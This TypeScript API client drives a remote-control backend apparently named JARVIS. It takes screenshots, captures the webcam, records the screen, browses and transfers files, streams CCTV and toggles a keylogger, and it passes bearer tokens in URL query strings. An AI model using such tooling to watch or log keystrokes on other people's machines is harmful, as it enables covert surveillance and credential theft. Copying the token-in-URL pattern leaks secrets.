/**
 * JARVIS API Client
 * Connects to the Python Flask backend.
 */

const API_BASE_KEY = "jarvis_api_url";
const TOKEN_KEY = "jarvis_token";

export function getApiBase(): string {
  if (typeof window === "undefined") return "";
  return localStorage.getItem(API_BASE_KEY) || "";
}

export function getToken(): string {
  if (typeof window === "undefined") return "";
  return localStorage.getItem(TOKEN_KEY) || "";
}

export function setCredentials(apiUrl: string, token: string) {
  localStorage.setItem(API_BASE_KEY, apiUrl.replace(/\/$/, ""));
  localStorage.setItem(TOKEN_KEY, token);
}

export function clearCredentials() {
  localStorage.removeItem(API_BASE_KEY);
  localStorage.removeItem(TOKEN_KEY);
}

async function request(path: string, options: RequestInit = {}): Promise<any> {
  const base = getApiBase();
  const token = getToken();

  if (!base) throw new Error("API URL not configured");

  const resp = await fetch(`${base}${path}`, {
    ...options,
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`,
      ...options.headers,
    },
  });

  if (!resp.ok) {
    const err = await resp.json().catch(() => ({ error: resp.statusText }));
    throw new Error(err.error || `HTTP ${resp.status}`);
  }

  const ct = resp.headers.get("content-type");
  if (ct?.includes("application/json")) return resp.json();
  return resp.blob();
}

// ── Auth ────────────────────────────────────────────────────────────────────
export async function login(apiUrl: string, password: string) {
  const url = apiUrl.replace(/\/$/, "");
  const resp = await fetch(`${url}/api/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ password }),
  });
  if (!resp.ok) throw new Error("Invalid password or unreachable API");
  return resp.json();
}

export async function ping() {
  return request("/api/ping");
}

// ── System ──────────────────────────────────────────────────────────────────
export async function getStatus() {
  return request("/api/status");
}

export async function getLogs(lines = 100) {
  return request(`/api/logs?lines=${lines}`);
}

// ── Control ─────────────────────────────────────────────────────────────────
export async function control(action: string, params: Record<string, any> = {}) {
  return request("/api/control", {
    method: "POST",
    body: JSON.stringify({ action, params }),
  });
}

export async function screenshot() {
  return request("/api/screenshot");
}

export async function webcam() {
  return request("/api/webcam");
}

export async function recordScreen(duration: number) {
  const base = getApiBase();
  const token = getToken();
  const resp = await fetch(`${base}/api/record`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
    body: JSON.stringify({ duration }),
  });
  if (!resp.ok) throw new Error("Recording failed");
  const blob = await resp.blob();
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `recording_${Date.now()}.mp4`;
  a.click();
  URL.revokeObjectURL(url);
}

// ── Files ───────────────────────────────────────────────────────────────────
export async function listFiles(path: string) {
  return request(`/api/files?path=${encodeURIComponent(path)}`);
}

export async function getDrives() {
  return request("/api/drives");
}

export function getDownloadUrl(path: string): string {
  const base = getApiBase();
  const token = getToken();
  return `${base}/api/download?path=${encodeURIComponent(path)}&token=${token}`;
}

export async function uploadFile(file: File, dir?: string) {
  const base = getApiBase();
  const token = getToken();
  const form = new FormData();
  form.append("file", file);
  if (dir) form.append("dir", dir);
  const resp = await fetch(`${base}/api/upload`, {
    method: "POST",
    headers: { Authorization: `Bearer ${token}` },
    body: form,
  });
  if (!resp.ok) throw new Error("Upload failed");
  return resp.json();
}

// ── AI ──────────────────────────────────────────────────────────────────────
export async function askAI(message: string, userId = 1) {
  return request("/api/ask", {
    method: "POST",
    body: JSON.stringify({ message, user_id: userId }),
  });
}

// ── Config ──────────────────────────────────────────────────────────────────
export async function getConfig() {
  return request("/api/config");
}

export async function updateConfig(data: Record<string, any>) {
  return request("/api/config", {
    method: "POST",
    body: JSON.stringify(data),
  });
}

// ── Keylogger ────────────────────────────────────────────────────────────────
export async function keyloggerAction(action: string) {
  return request("/api/keylogger", {
    method: "POST",
    body: JSON.stringify({ action }),
  });
}

export async function keyloggerStatus() {
  return request("/api/keylogger");
}

// ── URLs ─────────────────────────────────────────────────────────────────────
export function getCctvUrl(): string {
  const base = getApiBase();
  const token = getToken();
  return `${base}/cctv?token=${token}`;
}

export function getStreamUrl(): string {
  const base = getApiBase();
  const token = getToken();
  return `${base}/stream?token=${token}`;
}
